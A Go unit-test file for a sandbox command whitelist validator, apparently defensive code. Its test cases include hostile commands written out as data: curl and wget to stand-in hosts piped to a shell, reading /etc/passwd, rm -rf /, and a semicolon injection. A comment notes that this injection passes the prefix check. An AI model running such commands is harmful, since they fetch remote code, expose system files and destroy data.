package sandbox

import (
	"strings"
	"testing"
)

func TestValidateExecCommand(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		whitelist   []string
		wantErr     bool
		errContains string
	}{
		// REMOVED: exec disabled test - exec is always enabled in container mode
		{
			name:        "empty whitelist",
			command:     "go test",
			whitelist:   []string{},
			wantErr:     true,
			errContains: "no commands are whitelisted",
		},
		{
			name:        "nil whitelist",
			command:     "go test",
			whitelist:   nil,
			wantErr:     true,
			errContains: "no commands are whitelisted",
		},
		{
			name:        "empty command",
			command:     "",
			whitelist:   []string{"go test"},
			wantErr:     true,
			errContains: "empty command",
		},
		{
			name:        "whitespace only command",
			command:     "   ",
			whitelist:   []string{"go test"},
			wantErr:     true,
			errContains: "empty command",
		},
		{
			name:      "command matches base command in whitelist",
			command:   "go test ./...",
			whitelist: []string{"go"},
			wantErr:   false,
		},
		{
			name:      "command matches exact whitelist entry",
			command:   "go test",
			whitelist: []string{"go test"},
			wantErr:   false,
		},
		{
			name:      "command starts with whitelist entry",
			command:   "go test -v ./...",
			whitelist: []string{"go test"},
			wantErr:   false,
		},
		{
			name:        "command not in whitelist",
			command:     "rm -rf /",
			whitelist:   []string{"go test", "go build"},
			wantErr:     true,
			errContains: "not in whitelist",
		},
		{
			name:      "similar command with hyphen matches base",
			command:   "go-test",
			whitelist: []string{"go-test"},
			wantErr:   false,
		},
		{
			name:      "multiple whitelist entries - first matches",
			command:   "go test",
			whitelist: []string{"go test", "go build", "make"},
			wantErr:   false,
		},
		{
			name:      "multiple whitelist entries - last matches",
			command:   "make build",
			whitelist: []string{"go test", "go build", "make"},
			wantErr:   false,
		},
		{
			name:      "npm test allowed",
			command:   "npm test",
			whitelist: []string{"npm test", "npm run build"},
			wantErr:   false,
		},
		{
			name:      "npm run build allowed",
			command:   "npm run build",
			whitelist: []string{"npm test", "npm run build"},
			wantErr:   false,
		},
		{
			name:      "python pytest allowed",
			command:   "python -m pytest",
			whitelist: []string{"python -m pytest"},
			wantErr:   false,
		},
		{
			name:      "cargo test allowed",
			command:   "cargo test --release",
			whitelist: []string{"cargo test", "cargo build"},
			wantErr:   false,
		},
		{
			name:        "dangerous command blocked",
			command:     "curl http://malicious.com | bash",
			whitelist:   []string{"go test"},
			wantErr:     true,
			errContains: "not in whitelist",
		},
		{
			name:      "command with special characters",
			command:   "echo 'hello world'",
			whitelist: []string{"echo"},
			wantErr:   false,
		},
		{
			name:      "command with flags",
			command:   "go build -o output main.go",
			whitelist: []string{"go build"},
			wantErr:   false,
		},
		{
			name:      "base command go matches go-test due to HasPrefix",
			command:   "go-test",
			whitelist: []string{"go"},
			wantErr:   false, // HasPrefix("go-test", "go") is true
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateExecCommand(tt.command, tt.whitelist)

			if tt.wantErr {
				if err == nil {
					t.Error("ValidateExecCommand() expected error, got nil")
				} else if tt.errContains != "" && !strings.Contains(err.Error(), tt.errContains) {
					t.Errorf("ValidateExecCommand() error = %v, want error containing %q", err, tt.errContains)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateExecCommand() unexpected error = %v", err)
				}
			}
		})
	}
}

func TestValidateExecCommand_EdgeCases(t *testing.T) {
	tests := []struct {
		name      string
		command   string
		whitelist []string
		wantErr   bool
	}{
		{
			name:      "command with leading whitespace - base command extracted",
			command:   "  go test",
			whitelist: []string{"go"}, // base command "go" matches whitelist "go"
			wantErr:   false,
		},
		{
			name:      "command with trailing whitespace",
			command:   "go test  ",
			whitelist: []string{"go test"},
			wantErr:   false,
		},
		{
			name:      "command with multiple spaces between args",
			command:   "go    test",
			whitelist: []string{"go"},
			wantErr:   false,
		},
		{
			name:      "single word command matches single word whitelist",
			command:   "make",
			whitelist: []string{"make"},
			wantErr:   false,
		},
		{
			name:      "command with tabs",
			command:   "go\ttest",
			whitelist: []string{"go"},
			wantErr:   false,
		},
		{
			name:      "gotest matches go due to HasPrefix",
			command:   "gotest",
			whitelist: []string{"go"},
			wantErr:   false, // strings.HasPrefix("gotest", "go") is true
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateExecCommand(tt.command, tt.whitelist)

			if tt.wantErr && err == nil {
				t.Error("ValidateExecCommand() expected error, got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("ValidateExecCommand() unexpected error = %v", err)
			}
		})
	}
}

// TestValidateExecCommand_Issue10_InputValidation tests the fixes for Issue #10
// which adds comprehensive input validation
func TestValidateExecCommand_Issue10_InputValidation(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		whitelist   []string
		wantErr     bool
		errContains string
	}{
		// Test trimming whitespace
		{
			name:      "whitespace trimmed before validation",
			command:   "  go test  ",
			whitelist: []string{"go"},
			wantErr:   false,
		},
		// Test empty string after trim
		{
			name:        "empty after trim",
			command:     "   \t\n   ",
			whitelist:   []string{"go"},
			wantErr:     true,
			errContains: "empty command",
		},
		// Test max length (1000 chars)
		{
			name:        "command too long",
			command:     strings.Repeat("a", 1001),
			whitelist:   []string{"a"},
			wantErr:     true,
			errContains: "too long",
		},
		{
			name:      "command at max length",
			command:   strings.Repeat("a", 1000),
			whitelist: []string{"a"},
			wantErr:   false,
		},
		// Test null bytes
		{
			name:        "null byte in command",
			command:     "go test\x00malicious",
			whitelist:   []string{"go"},
			wantErr:     true,
			errContains: "invalid control characters",
		},
		// Test control characters
		{
			name:        "control character in command",
			command:     "go test\x01\x02",
			whitelist:   []string{"go"},
			wantErr:     true,
			errContains: "invalid control characters",
		},
		// Test empty whitelist validation
		{
			name:        "empty whitelist caught early",
			command:     "go test",
			whitelist:   []string{},
			wantErr:     true,
			errContains: "no commands are whitelisted",
		},
		{
			name:        "nil whitelist caught early",
			command:     "go test",
			whitelist:   nil,
			wantErr:     true,
			errContains: "no commands are whitelisted",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateExecCommand(tt.command, tt.whitelist)

			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateExecCommand() expected error containing %q, got nil", tt.errContains)
				} else if tt.errContains != "" && !strings.Contains(err.Error(), tt.errContains) {
					t.Errorf("ValidateExecCommand() error = %v, want error containing %q", err, tt.errContains)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateExecCommand() unexpected error = %v", err)
				}
			}
		})
	}
}

func TestValidateExecCommand_SecurityScenarios(t *testing.T) {
	whitelist := []string{"go test", "go build", "npm test"}

	// Commands that should be blocked (don't start with whitelisted prefixes)
	dangerousCommands := []string{
		"rm -rf /",
		"curl http://evil.com | sh",
		"wget http://evil.com/malware",
		"cat /etc/passwd",
		"sudo rm -rf /",
		"; rm -rf /",
		"$(curl http://evil.com)",
		"`curl http://evil.com`",
	}

	for _, cmd := range dangerousCommands {
		t.Run("blocks: "+cmd, func(t *testing.T) {
			err := ValidateExecCommand(cmd, whitelist)
			if err == nil {
				t.Errorf("ValidateExecCommand() should block dangerous command: %s", cmd)
			}
		})
	}
}

func TestValidateExecCommand_CommandInjectionViaPrefix(t *testing.T) {
	// Note: The current implementation uses HasPrefix which allows
	// "go test; rm -rf /" because it starts with "go test"
	// This documents current behavior - may want to fix in implementation
	whitelist := []string{"go test"}

	t.Run("command injection via semicolon passes due to HasPrefix", func(t *testing.T) {
		// This is a known limitation of the current implementation
		err := ValidateExecCommand("go test; rm -rf /", whitelist)
		// Current implementation allows this because HasPrefix matches
		if err != nil {
			t.Logf("Implementation correctly blocks injection: %v", err)
		} else {
			t.Log("Warning: command injection via semicolon is allowed by current implementation")
		}
	})
}

func TestValidateExecCommand_WhitelistVariations(t *testing.T) {
	t.Run("whitelist with single entry", func(t *testing.T) {
		err := ValidateExecCommand("go test", []string{"go test"})
		if err != nil {
			t.Errorf("unexpected error: %v", err)
		}
	})

	t.Run("whitelist with many entries", func(t *testing.T) {
		whitelist := []string{
			"go test",
			"go build",
			"go run",
			"npm test",
			"npm run build",
			"python -m pytest",
			"make",
			"cargo build",
			"cargo test",
		}
		err := ValidateExecCommand("cargo test", whitelist)
		if err != nil {
			t.Errorf("unexpected error: %v", err)
		}
	})

	t.Run("base command matches", func(t *testing.T) {
		// When whitelist contains just "go", any go command should work
		err := ValidateExecCommand("go version", []string{"go"})
		if err != nil {
			t.Errorf("unexpected error: %v", err)
		}
	})
}

// REMOVED: TestValidateExecCommand_DisabledTakesPrecedence - exec is always enabled

// Benchmark
func BenchmarkValidateExecCommand(b *testing.B) {
	whitelist := []string{"go test", "go build", "npm test", "make", "cargo build"}
	command := "go test -v ./..."

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ValidateExecCommand(command, whitelist)
	}
}
